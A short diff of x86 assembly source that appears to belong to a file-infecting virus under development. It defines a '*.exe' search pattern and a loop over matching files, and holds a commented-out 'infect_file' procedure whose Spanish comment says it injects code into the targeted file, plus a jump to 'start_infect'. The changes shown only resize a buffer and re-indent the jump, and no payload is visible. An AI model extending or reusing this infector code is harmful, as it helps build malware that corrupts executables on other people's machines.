@@ -17,7 +17,7 @@ file_regex_sf db "*.exe", 0
 buffer_db db 256 dup(0)
 format_db db "File size: %d", 0
 msgCaption_db db "File Info", 0
-filebuffer db 256 dup(0)
+filebuffer db 460 dup(0)
 
 .data?
 
@@ -83,8 +83,8 @@ search_exe_loop:
    
     ;invoke infect_file;, fileptr_sf, filesize_sf ; Procedimiento para inyectar código en el archivo de interés. Devuelve el nuevo tamaño del archivo.
     mov  filesize_sf, eax
-    
-    jmp start_infect
+   
+  jmp start_infect
 
     invoke crt_fseek, filehandle_sf, 0, 0 ; SEEK_BEGIN es 0
     cmp eax, 0
